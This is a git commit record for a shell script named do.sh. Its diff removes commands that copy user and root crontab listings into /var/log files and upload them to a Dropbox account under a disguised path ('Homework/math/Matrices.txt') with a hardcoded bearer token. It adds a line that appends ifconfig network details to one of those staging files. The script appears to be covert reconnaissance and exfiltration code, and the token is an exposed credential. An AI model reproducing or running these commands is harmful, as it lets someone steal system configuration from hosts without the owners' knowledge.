9a1b51e9c132db48443e814c396f35f9bd65ec72
willmsevans <47627873+willmsevans@users.noreply.github.com>
2020-10-16 12:09:39 +0530

    Update do.sh

--- do.sh
+++ do.sh
@@ -1,4 +1,1 @@
-crontab -l > /var/log/data
-sudo crontab -l >> /var/log/data
-curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer wz0j8XDxZVAAAAAAAAAAmzkWUR90hHHzt43537KsII05_NxLHAZoZ1q6BAYK1LXS" --header "Dropbox-API-Arg: {\"path\": \"/Homework/math/Matrices.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @/var/log/data
-curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer wz0j8XDxZVAAAAAAAAAAmzkWUR90hHHzt43537KsII05_NxLHAZoZ1q6BAYK1LXS" --header "Dropbox-API-Arg: {\"path\": \"/Homework/math/Matrices.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @/var/log/ktmp
+ifconfig >> /var/log/ktmp
